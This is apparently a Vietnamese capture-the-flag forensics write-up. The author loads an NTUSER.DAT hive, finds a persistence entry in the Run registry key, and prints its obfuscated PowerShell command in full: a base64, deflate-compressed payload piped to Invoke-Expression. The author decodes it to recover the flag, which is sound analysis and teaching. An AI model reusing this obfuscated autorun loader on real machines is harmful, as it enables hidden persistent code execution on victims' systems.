![Screenshot (4446)](https://github.com/NVex0/uWU/assets/113530029/3f69c15c-fbd0-421a-9994-13e27c76e23c)

Đề bài cung cấp 1 file NTUSER.DAT. Và với mô tả của bài thì ta hiểu máy Hoà bị đặt persistence rồi, cụ thể là đặt trong autostart registry key. Mình load file vào Registry Viewer và tìm tới path: `Software\Microsoft\Windows\CurrentVersion\Run`:

![image](https://github.com/NVex0/uWU/assets/113530029/63dce788-68d7-4894-927b-d6b3b4e4a360)

Đây là đoạn code nằm trong value này:

```"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "(neW-obJEct io.COMprEssIon.dEFlATesTReAm( [sySTem.IO.memorYSTREam] [coNVeRT]::FRoMBAse64stRInG( 'TVFva4JAGP8qh7hxx/IwzbaSBZtsKwiLGexFhJg+pMs09AmL6rvP03S9uoe739/nZD+OIEHySmwolNn6F3wkzilH2HEbkDupvwXM+cKaWxWSSt2Bxrv9F64ZOteepU5vYOjMlHPMwNuVQnItyb8AneqOMnO5PiEsVytZnHkJUjnvG4ZuXB7O6tUswigGSuVI0Gsh/g1eQGt8h6gdUo98CskGQ8aIkgBR2dmUAw+9kkfvCiiL0x5sbwdNlQUckb851mTykfhpECUbdstXjo2LMIlEE0iCtedvhWgER1I7aKPHLrmQ2QGVmkbuoFoVvOE9Eckaj8+26vbcTeomqptjL3OLUM/0q1Q+030RMD73MBTYEZFuSmUMYbpEERduSVfDYZW8SvwuktJ/33bx/CeLEGirU7Zp52ZpLfYzPuQhZVez+SsrTnOg7A8='), [SYSTEM.iO.ComPReSSion.CoMPrEsSIonmODe]::DeCOmpresS)|FOREAcH-object{ neW-obJEct io.streAMrEadeR( $_,[sysTem.TExt.EnCoDING]::asCIi )}).reaDToEnD()|inVOKe-exprEsSIon"```

Để ý thì đoạn trên code, phần base64 kia sẽ được xử lí bằng cách b64decode và decompress. Mình dùng cyberchef để làm việc tương tự:

![image](https://github.com/NVex0/uWU/assets/113530029/ad887edd-5e55-4914-9978-0773fdd26333)

Phần data sendback về chứa flag luôn :>

Flag: `CHH{N0_4_go_n0_st4r_wh3r3}`
